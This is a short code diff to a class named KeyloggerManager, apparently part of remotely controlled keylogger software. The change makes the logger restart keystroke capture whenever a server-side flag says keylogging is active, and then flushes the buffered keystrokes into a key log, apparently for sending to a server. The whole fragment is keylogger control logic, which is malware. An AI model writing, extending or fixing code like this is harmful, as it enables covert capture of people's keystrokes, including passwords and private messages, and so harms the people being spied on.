@@ -27,6 +27,8 @@ class KeyloggerManager:
             if current_time - self.last_buffer_send >= Flush_interval :
                 if not self.server_utils.isKeylogActive():
                     self.service.stop_logging()
+                else:
+                    self.service.start_logging()
                 buffer_data = self.service.get_buffer_data()
                 if buffer_data:
                     key_log = self.dictWriter.process_keylog(buffer_data)
